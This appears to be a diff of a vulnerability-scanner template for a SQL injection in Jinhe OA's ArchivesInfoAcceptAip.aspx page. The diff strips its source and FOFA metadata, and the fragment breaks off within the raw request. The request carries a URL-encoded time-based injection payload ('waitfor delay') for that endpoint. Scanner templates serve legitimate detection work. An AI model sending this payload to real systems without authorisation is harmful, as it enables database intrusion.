@@ -3,12 +3,8 @@ info:
   name: 金和OA ArchivesInfoAcceptAip.aspx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/if0gptk5h8ivt8pc'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: if0gptk5h8ivt8pc
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'GET /c6/Jhsoft.Web.Archives/ArchivesInfoAcceptAip.aspx/?id=%31%27%77%61%69%74%66%6f%72%20%64%65%6c%61%79%27%30%3a%30%3a%35%27%2d%2d  HTTP/1.1
